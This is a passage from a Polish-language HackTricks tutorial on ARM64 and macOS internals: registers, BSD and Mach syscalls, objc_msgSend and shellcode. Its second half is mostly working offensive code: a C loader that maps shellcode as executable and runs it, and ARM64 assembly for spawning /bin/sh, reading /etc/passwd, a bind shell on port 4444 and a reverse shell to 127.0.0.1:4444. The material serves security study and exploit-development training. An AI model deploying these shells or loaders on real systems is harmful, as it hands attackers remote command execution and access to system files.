Na przykład, instrukcja **`UADD8`** **dodaje cztery pary bajtów** (z dwóch 32-bitowych operandów) równolegle i przechowuje wyniki w 32-bitowym rejestrze. Następnie **ustawia flagi `GE` w `APSR`** na podstawie tych wyników. Każda flaga GE odpowiada jednej z dodawanych par bajtów, wskazując, czy dodawanie dla tej pary bajtów **przepełniło się**.

Instrukcja **`SEL`** wykorzystuje te flagi GE do wykonywania działań warunkowych.

#### Rejestry Stanu Wykonania

* Bity **`J`** i **`T`**: **`J`** powinien być 0, a jeśli **`T`** jest 0, używana jest instrukcja A32, a jeśli jest 1, używana jest T32.
* **Rejestr Stanu Bloku IT** (`ITSTATE`): To bity od 10-15 i 25-26. Przechowują warunki dla instrukcji w grupie z prefiksem **`IT`**.
* Bit **`E`**: Wskazuje na **endianness**.
* **Bity Maski Trybu i Wyjątku** (0-4): Określają aktualny stan wykonania. **5.** wskazuje, czy program działa jako 32-bitowy (1) czy 64-bitowy (0). Pozostałe 4 reprezentują **tryb wyjątku aktualnie używany** (gdy występuje wyjątek i jest obsługiwany). Ustawiona liczba **wskazuje aktualny priorytet** w przypadku, gdy inny wyjątek zostanie wywołany podczas jego obsługi.

<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>

* **`AIF`**: Niektóre wyjątki mogą być wyłączone za pomocą bitów **`A`**, `I`, `F`. Jeśli **`A`** wynosi 1, oznacza to, że **asynchroniczne przerwania** będą wywoływane. **`I`** konfiguruje odpowiedź na zewnętrzne żądania przerwań sprzętowych (IRQ). a F jest związane z **szybkimi żądaniami przerwań** (FIR).

## macOS

### Wywołania systemowe BSD

Sprawdź [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master). Wywołania systemowe BSD będą miały **x16 > 0**.

### Pułapki Mach

Sprawdź w [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html) tabelę `mach_trap_table` oraz w [**mach\_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach\_traps.h) prototypy. Maksymalna liczba pułapek Mach to `MACH_TRAP_TABLE_COUNT` = 128. Pułapki Mach będą miały **x16 < 0**, więc musisz wywołać numery z poprzedniej listy z **minusem**: **`_kernelrpc_mach_vm_allocate_trap`** to **`-10`**.

Możesz również sprawdzić **`libsystem_kernel.dylib`** w dezasemblatorze, aby znaleźć, jak wywołać te (i BSD) wywołania systemowe:

{% code overflow="wrap" %}
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% endcode %}

Zauważ, że **Ida** i **Ghidra** mogą również dekompilować **specyficzne dyliby** z pamięci podręcznej, po prostu przekazując pamięć podręczną.

{% hint style="success" %}
Czasami łatwiej jest sprawdzić **dekompilowany** kod z **`libsystem_kernel.dylib`** **niż** sprawdzać **kod źródłowy**, ponieważ kod kilku wywołań systemowych (BSD i Mach) jest generowany za pomocą skryptów (sprawdź komentarze w kodzie źródłowym), podczas gdy w dylib możesz znaleźć, co jest wywoływane.
{% endhint %}

### wywołania machdep

XNU obsługuje inny typ wywołań zwany zależnymi od maszyny. Liczba tych wywołań zależy od architektury, a ani wywołania, ani liczby nie są gwarantowane, że pozostaną stałe.

### strona comm

To jest strona pamięci należąca do jądra, która jest mapowana do przestrzeni adresowej każdego procesu użytkownika. Ma na celu przyspieszenie przejścia z trybu użytkownika do przestrzeni jądra w porównaniu do używania wywołań systemowych dla usług jądra, które są używane tak często, że to przejście byłoby bardzo nieefektywne.

Na przykład wywołanie `gettimeofdate` odczytuje wartość `timeval` bezpośrednio z strony comm.

### objc\_msgSend

Bardzo często można znaleźć tę funkcję używaną w programach Objective-C lub Swift. Ta funkcja pozwala na wywołanie metody obiektu Objective-C.

Parametry ([więcej informacji w dokumentacji](https://developer.apple.com/documentation/objectivec/1456712-objc\_msgsend)):

* x0: self -> Wskaźnik do instancji
* x1: op -> Selektor metody
* x2... -> Reszta argumentów wywoływanej metody

Więc, jeśli ustawisz punkt przerwania przed przejściem do tej funkcji, możesz łatwo znaleźć, co jest wywoływane w lldb (w tym przykładzie obiekt wywołuje obiekt z `NSConcreteTask`, który uruchomi polecenie):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
{% hint style="success" %}
Ustawiając zmienną środowiskową **`NSObjCMessageLoggingEnabled=1`**, można rejestrować, kiedy ta funkcja jest wywoływana w pliku takim jak `/tmp/msgSends-pid`.

Ponadto, ustawiając **`OBJC_HELP=1`** i wywołując dowolny binarny, można zobaczyć inne zmienne środowiskowe, które można wykorzystać do **logowania**, kiedy występują określone akcje Objc-C.
{% endhint %}

Kiedy ta funkcja jest wywoływana, należy znaleźć wywoływaną metodę wskazanej instancji, w tym celu przeprowadza się różne wyszukiwania:

* Wykonaj optymistyczne wyszukiwanie w pamięci podręcznej:
* Jeśli zakończone sukcesem, gotowe
* Zdobądź runtimeLock (odczyt)
* Jeśli (realize && !cls->realized) zrealizuj klasę
* Jeśli (initialize && !cls->initialized) zainicjuj klasę
* Spróbuj pamięci podręcznej własnej klasy:
* Jeśli zakończone sukcesem, gotowe
* Spróbuj listy metod klasy:
* Jeśli znalezione, wypełnij pamięć podręczną i gotowe
* Spróbuj pamięci podręcznej klasy nadrzędnej:
* Jeśli zakończone sukcesem, gotowe
* Spróbuj listy metod klasy nadrzędnej:
* Jeśli znalezione, wypełnij pamięć podręczną i gotowe
* Jeśli (resolver) spróbuj resolvera metod i powtórz od wyszukiwania klasy
* Jeśli nadal tutaj (= wszystko inne nie powiodło się) spróbuj forwardera

### Shellcodes

Aby skompilować:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Aby wyodrębnić bajty:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Dla nowszych macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>Kod C do testowania shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Pobrane z [**tutaj**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) i wyjaśnione.

{% tabs %}
{% tab title="z adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="ze stosem" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}

{% tab title="z adr dla linux" %}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}
{% endtabs %}

#### Czytaj za pomocą cat

Celem jest wykonanie `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, więc drugi argument (x1) to tablica parametrów (co w pamięci oznacza stos adresów).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Wywołaj polecenie z sh z fork, aby główny proces nie został zabity
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell z [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) na **porcie 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Z [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), revshell do **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
